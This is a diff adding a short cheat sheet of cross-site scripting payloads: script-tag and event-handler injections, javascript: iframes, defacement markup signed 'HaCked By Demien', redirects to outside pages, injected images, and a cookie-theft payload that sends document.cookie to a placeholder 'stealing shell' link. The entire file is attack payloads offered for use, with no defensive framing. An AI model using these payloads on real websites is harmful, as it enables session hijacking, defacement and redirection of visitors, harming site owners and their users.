@@ -1,0 +1,38 @@
+ 
+* Testing Scripts:
+
+'"--></style></script><script>alert(test)</script>
+"><input onfocus=alert(test) autofocus>
+"><IFRAME SRC="javascript:alert('test');"></IFRAME>
+<ScRiPt>prompt(test)</ScRiPt>
+"><script>alert(test);</script>
+"/><script>alert(test);</script>
+"><script>alert("HaCked By");</script>
+"><script>alert(String.fromCharCode(88,115,115,32,66,121,32,68,101,109,105,101,110));</script>
+/"/title><script>alert("HaCked By ");</script>
+
+"><img src=x onerror=alert("test");>
+"><marquee><h1>HaCked By Demien*</h1></marquee>
+
+
+* Redirect:
+<script>location="http://google.com";</script>
+
+
+Redirect With Images:
+<script>window.location="http://4.bp.blogspot.com/-KQTZ3CRXCGg/UOMe03z-tqI/AAAAAAAAAMQ/sbhRFaYtOkc/s1600/xss.gif";</script>
+
+
+* Add Images To The Site:
+<img src="http://4.bp.blogspot.com/-KQTZ3CRXCGg/UOMe03z-tqI/AAAAAAAAAMQ/sbhRFaYtOkc/s1600/xss.gif">
+
+<img src="http://i1-news.softpedia-static.com/images/fitted/340x180/infographic-how-xss-attacks-work.jpg">
+<img src="https://i.ytimg.com/vi/-dCApdB4QQk/maxresdefault.jpg">
+
+* Steal Information:
+<script>alert(document.cookie);</script>
+
+
+* Steal Cookies:
+<script>alert(link of the stealing shell)</script>
+<script>document.location='link of the stealing shell?cookie='+escape(document.cookie)</script>
